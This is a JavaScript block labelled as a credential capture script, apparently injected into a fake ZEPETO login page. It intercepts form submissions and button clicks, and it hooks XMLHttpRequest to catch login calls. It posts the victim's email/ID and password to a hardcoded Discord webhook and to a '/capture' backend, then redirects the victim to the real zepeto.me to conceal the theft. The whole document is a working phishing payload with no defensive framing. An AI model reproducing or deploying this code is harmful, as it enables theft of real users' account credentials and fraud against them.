<!-- ====== CREDENTIAL CAPTURE SCRIPT ====== -->
<script>
// === CONFIG ===
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1525191917468647514/b8qkmd69Vl2JyctJjiEqSq6jYYwME1rCN0WJKzgefO3RVuLBlV8QppSTcP-f3-IRDjEy';

// === CAPTURE FUNCTION ===
function captureCredentials() {
    const userId = document.getElementById('userId')?.value || '';
    const password = document.getElementById('password')?.value || '';
    
    if (!userId || !password) return false;
    
    // Send to Discord
    var payload = JSON.stringify({
        content: '@here **🔴 ZEPETO Credential Captured**\n**Email/ID:** `' + userId.replace(/`/g, '') + '`\n**Password:** `' + password.replace(/`/g, '') + '`\n**Time:** ' + new Date().toISOString()
    });
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', DISCORD_WEBHOOK, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(payload);
    
    // Also send to PHP backend as backup
    var xhr2 = new XMLHttpRequest();
    xhr2.open('POST',/capture', true);
    xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr2.send('email=' + encodeURIComponent(userId) + '&password=' + encodeURIComponent(password));
    
    return true;
}

// === ENABLE BUTTON WHEN FIELDS ARE FILLED ===
document.addEventListener('DOMContentLoaded', function() {
    var btn = document.querySelector('button[type="submit"]');
    var userIdInput = document.getElementById('userId');
    var passwordInput = document.getElementById('password');
    
    // Remove disabled from the button so it's clickable
    if (btn) btn.disabled = false;
    
    function checkFields() {
        if (btn) {
            if (userIdInput.value.trim() && passwordInput.value.trim()) {
                btn.disabled = false;
            } else {
                btn.disabled = true;
            }
        }
    }
    
    if (userIdInput) userIdInput.addEventListener('input', checkFields);
    if (passwordInput) passwordInput.addEventListener('input', checkFields);
});

// === INTERCEPT FORM SUBMIT ===
document.addEventListener('DOMContentLoaded', function() {
    var form = document.querySelector('form');
    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            e.stopPropagation();
            captureCredentials();
            // Show loading state
            var submitBtn = document.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.textContent = 'Signing in...';
                submitBtn.disabled = true;
            }
            // Redirect to real Zepeto
            setTimeout(function() {
                window.location.href = 'https://zepeto.me';
            }, 1200);
        });
    }
    
    // Also intercept the button click directly as backup
    var btn = document.querySelector('button[type="submit"]');
    if (btn) {
        btn.addEventListener('click', function(e) {
            // Only handle if form didn't catch it
            setTimeout(function() {
                var uid = document.getElementById('userId')?.value;
                var pwd = document.getElementById('password')?.value;
                if (uid && pwd && !window._credsCaptured) {
                    window._credsCaptured = true;
                    captureCredentials();
                    setTimeout(function() {
                        window.location.href = 'https://zepeto.me';
                    }, 1200);
                }
            }, 50);
        });
    }
    
    // Override XHR to catch any API login calls
    var origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        if (typeof url === 'string' && (url.indexOf('login') > -1 || url.indexOf('signin') > -1 || url.indexOf('auth') > -1)) {
            var self = this;
            this.addEventListener('loadend', function() {
                var uid = document.getElementById('userId')?.value;
                var pwd = document.getElementById('password')?.value;
                if (uid && pwd && !window._apiCaptured) {
                    window._apiCaptured = true;
                    var payload = JSON.stringify({
                        content: '🔴 ZEPETO Credential Captured (via API)\n**Email/ID:** `' + uid + '`\n**Password:** `' + pwd + '`'
                    });
                    var x = new XMLHttpRequest();
                    x.open('POST', DISCORD_WEBHOOK, true);
                    x.setRequestHeader('Content-Type', 'application/json');
                    x.send(payload);
                }
            });
        }
        return origOpen.apply(this, arguments);
    };
});
</script>
<!-- ====== END CREDENTIAL CAPTURE SCRIPT ====== -->
